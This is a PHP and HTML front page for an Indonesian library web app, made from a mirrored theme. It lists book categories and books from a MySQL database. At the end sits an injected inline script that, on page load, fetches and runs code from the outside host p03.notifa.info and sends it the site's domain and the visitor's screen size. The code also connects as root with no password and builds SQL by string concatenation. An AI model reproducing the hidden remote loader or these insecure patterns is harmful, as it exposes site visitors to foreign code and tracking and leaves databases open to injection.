<?php 
$conn = mysqli_connect("localhost", "root", "", "perpustakaan");
$sql = "SELECT * FROM jenis_buku";
$result = $conn->query($sql);
?>
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from kodeforest.net/html/books/library/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 04:57:23 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Selamat Datang Di Perpustakaan</title>
    <!-- CUSTOM STYLE -->
    <link href="style.css" rel="stylesheet">
    <!-- THEME TYPO -->
    <link href="css/themetypo.css" rel="stylesheet">
    <!-- BOOTSTRAP -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <!-- COLOR FILE -->
    <link href="css/color.css" rel="stylesheet">
    <!-- FONT AWESOME -->
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <!-- BX SLIDER -->
    <link href="css/jquery.bxslider.css" rel="stylesheet">
    <!-- Boostrap Slider -->
    <link href="css/bootstrap-slider.css" rel="stylesheet">
    <!-- Widgets -->
    <link href="css/widget.css" rel="stylesheet">
    <!-- Owl Carusel -->
    <link href="css/owl.carousel.css" rel="stylesheet">
    <!-- responsive -->
    <link href="css/responsive.css" rel="stylesheet">
    <!-- Component -->
    <link href="js/dl-menu/component.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/bookblock.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<body>
    <div id="loader-wrapper">
        <div id="loader"></div>

        <div class="loader-section section-left"></div>
        <div class="loader-section section-right"></div>

    </div>
    <!--WRAPPER START-->
    <div class="wrapper kode-header-class-3">
        <!--HEADER START-->
        <header class="header-3">
            <div class="container">
                <div class="logo-container">
                    <div class="row">
                        <div class="col-md-3">
                            <!--LOGO START-->
                            <div class="logo">
                                <a href="#"><img src="images/logo-2.png" alt=""></a>
                            </div>
                            <!--LOGO END-->
                        </div>
                        <div class="col-md-9">
                            <div class="top-strip">
                                <div class="pull-left">
                                    <p>Selamat Datang di Peroustakaan Kami</p>
                                </div>
                                <div class="social-icon">
                                  
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-linkedin"></i></a></li>                      
                                    </ul>

                                </div>
                                 <div class="kode-navigation">
                                <ul>
                                    <li><a href="index.php">Beranda</a>
                                        <ul>
                                            <li><a href="index.php">Tentang Perpustakaan</a></li>
                                        </ul>
                                    </li>

                                    <li><a href="admin.php">Admin</a></li>


                                    <li><a href="jenisbuku.php">Jenis Buku</a>
                                        <ul>
                                            <li><a href="books3-sidebar.html">Novel</a></li>
                                            <li><a href="books-detail.html">Pengetahuan</a></li>
                                            <li><a href="books-detail.html">Cerpen</a></li>
                                            <li><a href="books-detail.html">Komik</a></li>                                
                                        </ul>
                                    </li>
                                    <li><a href="anggota.php">Anggota</a>
                                        
                                    </li>
                                    <li><a href="peminjaman.php">Peminjaman</a>
                                        
                                    </li>
                                    <li class="last"><a href="pengembalian.php">Pengembalian</a>
                                       
                                    </li>




                                    <div id="kode-responsive-navigation" class="dl-menuwrapper">
                                        <button class="dl-trigger">Open Menu</button>
                                        <ul class="dl-menu">
                                            <li class="menu-item kode-parent-menu"><a href="index.php">Beranda</a>
                                                <ul class="dl-submenu">
                                                    <li><a href="index.php">Tentang Perpustakaan</a></li>
                                                </ul>
                                            </li>
                                            <li><a href="admin.php">Admin</a></li>
                                            <li class="menu-item kode-parent-menu"><a href="jenisbuku.php">Jenis Buku</a>
                                                <ul class="dl-submenu">
                                                    <li><a href="books3-sidebar.html">Novel</a></li>
                                                    <li><a href="books-detail.html">Pengetahuan</a></li>
                                                    <li><a href="books-detail.html">Cerpen</a></li>
                                                    <li><a href="books-detail.html">Komik</a></li>                                
                                                </ul>
                                            </li>
                                            <li class="menu-item kode-parent-menu"><a href="anggota.php">Anggota</a>
                                                
                                            </li>
                                            <li class="menu-item kode-parent-menu last"><a href="peminjaman.php">Peminjaman</a>
                                                
                                            </li>
                                            <li class="menu-item kode-parent-menu last"><a href="pengembalian.php">Pengembalian</a>

                                            </li>

                                        </div>
                                    </div>
                                </div>
                            </div>
                            </div>
                        </div>
                    </header>
                    <!--HEADER END-->
                    <!--BANNER START-->
                    <div class="kode-banner">
                        <ul class="bxslider">
                            <li>
                                <img src="images/banner-2.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.</p>
                                    <div class="caption-btns">
                                        <a href="#">Lihat Selengkapnya</a>
                                        <a href="#">Beli Sekarang</a>
                                    </div>                  
                                </div>
                            </li>

                            <li>
                                <img src="images/banner-2.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.</p>
                                    <div class="caption-btns">
                                        <a href="#">Lihat Selengkapnya</a>
                                        <a href="#">Beli Sekarang</a>
                                    </div>                  
                                </div>
                            </li>
                            
                            <li>
                                <img src="images/banner-3.png" alt="">
                                <div class="kode-caption-2">
                                    <h5>Apakah Kamu Mencari Buku...?</h5>
                                    <h2>Di Perpustakaan terbesar</h2>
                                    <p>Selain itu, Anda juga dapat menemukan kesalahan saat ini untuk mengakses lebih lanjut, kemudian menambahkan semua yang Anda butuhkan.p>
                                        <div class="caption-btns">
                                            <a href="#">Lihat Selengkapnya</a>
                                            <a href="#">Beli Sekarang</a>
                                        </div>                  
                                    </div>
                                </li>
                            </ul>
                        </div>
                        <!--BANNER END-->
                        <!--BUT NOW START-->
                        <div class="search-section">
                            <div class="container">



                                <!-- Tab panes -->
                                <div class="tab-content">
                                    <div role="tabpanel" class="tab-pane active" id="Admin">
                                        <div class="form-container">
                                            <div class="row">
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="ID Admin">
                                                </div>
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="Nama">
                                                </div>
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="Password">
                                                </div>
                                                <div class="col-md-3 col-sm-12">
                                                    <button>Masuk Sebagai Admin</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div role="tabpanel" class="tab-pane" id="Anggota">
                                        <div class="form-container">
                                            <div class="row">
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="ID Anggota">
                                                </div>
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="Nama">
                                                </div>
                                                <div class="col-md-3 col-sm-4">
                                                    <input type="text" placeholder="Alamat">
                                                </div>
                                                <div class="col-md-3 col-sm-12">
                                                    <button>Masuk Sebagai Anggota</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                        <!--BUT NOW END-->
                        <!--CONTENT START-->
                        <div class="kode-content">

                            <!--BOOK GUIDE SECTION END-->
                            <!--TOP SELLERS SECTION START-->
                            <section class="lib-categories-section">
                                <div class="container">
                                    <!--SECTION CONTENT START-->
                                    <div class="section-heading-1 dark-sec">
                                         
                                        <div class="kode-icon"><i class="fa fa-book"></i></div>
                                    </div>
                                    <!--SECTION CONTENT END-->
                                    <ul class="nav nav-tabs" role="tablist">

                                        <?php 
                                        foreach ($result as $r) { ?>
                                            <li role="presentation"><a href="#" role="tab" data-toggle="tab"><?php echo $r['jenis_buku'] ?></a></li>   
                                        <?php } ?>    
                                    </ul>

                                    <!-- Tab panes -->
                                    <div class="tab-content">
                                        <div role="tabpanel" class="tab-pane fade in active" id="Photography">
                                            <ul class="bxslider">
                                                <?php 
                                                    foreach ($result as $r) {?>
                                                        <li class="<?php echo $r['jenis_buku']; ?>">
                                                            <?php 
                                                            $jb = $r['jenis_buku'];
                                                            $buku = mysqli_query($conn,"SELECT * FROM buku WHERE jenis_buku = '".$jb."'");
                                                            while($b = mysqli_fetch_array($buku)){ ?>
                                                                
                                                            
                                                            <div class="col-md-3 col-sm-6 best-seller-pro">
                                                                <figure>
                                                                    <img src="images/<?php echo $b['sampul_buku'] ?>" alt=""width="100%" height="350px;">
                                                                </figure>
                                                                <div class="kode-text">
                                                                    <h3><?php echo $b['judul_buku'] ?></h3>
                                                                </div>
                                                                <div class="kode-caption">
                                                                    <h3><?php echo $b['judul_buku'] ?></h3>

                                                                    <a href="/<?php echo $b['link'] ?>" class="add-to-cart">Pinjam</a>
                                                                </div>
                                                            </div>
                                                            <?php }?>
                                                        </li>
                                                 <?php  } ?>

                                            </ul>

                                        </div>
                                    </div>
                                </div>
                            </section>
<footer class="footer-2">
                                <div class="container">
                                    <div class="lib-copyrights">
                                        <p>Copyrights © 2015-16 KodeForest. All rights reserved</p>
                                        <div class="social-icon">
                                            <ul>
                                                <li><a href="#" data-toggle="tooltip" title="Facebook"><i class="fa fa-facebook"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Linkedin"><i class="fa fa-linkedin"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Twitter"><i class="fa fa-twitter"></i></a></li>
                                                <li><a href="#" data-toggle="tooltip" title="Tumblr"><i class="fa fa-tumblr"></i></a></li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="back-to-top">
                                        <a href="#home"><i class="fa fa-angle-up"></i></a>
                                    </div>
                                </div>
                            </footer>
                        </div>
                        <!--WRAPPER END-->
                        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
                        <script src="js/jquery.min.js"></script>
                        <!-- Include all compiled plugins (below), or include individual files as needed -->
                        <script src="js/modernizr.custom.js"></script>
                        <script src="js/bootstrap.min.js"></script>
                        <script src="js/jquery.bxslider.min.js"></script>
                        <script src="js/bootstrap-slider.js"></script>
                        <script src="js/waypoints.min.js"></script> 
                        <script src="js/jquery.counterup.min.js"></script>
                        <script src="js/owl.carousel.js"></script>
                        <script src="js/dl-menu/jquery.dlmenu.js"></script>
                        <script type="text/javascript" src="lib/hash.js"></script>
                        <script type="text/javascript" src="lib/booklet-lib.js"></script>
                        <script src="js/jquerypp.custom.js"></script>
                        <script src="js/jquery.bookblock.js"></script>
                        <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false"></script>
                        <script src="js/functions.js"></script>
                        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupWL9qdaP3o2eA4Fl2DzSmxxZfLlYNG2KeHgfPNvnhIzWJ1KZodKXlO9NGNn50Wf2ri4YVMuV9wzTPj4UoQvbt%2b%2b0r9kEdtDz%2bXjp9Jkkz4NHNu7q5OZELOLiHug7CHz2OZfLKeN%2f%2b2pihWiu3YylRTf1l2c2Afry5vOX26GrDmqFEKk%2bzMcN5rcQBarhV%2b0p5iFT0oCk6613ZILIJsvRCyKPh04t9HLqS7ioLE0AJz69a25ArO2VpUjCCl3%2bB4QLe5b7sdvi0GSQQ7AQ6f0VMyTQ1Vh9k%2fie6PTRJ1tLIIWZDg3Ur7yyyRWERrdFekOCINNbzIoP%2bEVMUuyPqivdshqzk%2bcxMmTpotPgTEolZSE3AO%2fQ0BbBeJyaC9z2xqBdzE%2bzISOON%2fyFyNShw5qfCX4gBxfsUr34Eh1hxXpSCuAW7NuE9Zkh4DJPk8iBGJV06b1wGVtnyntLCrEMm1Xr9yXjVMICHPic10%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

                        <!-- Mirrored from kodeforest.net/html/books/library/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:03:52 GMT -->
                        </html>  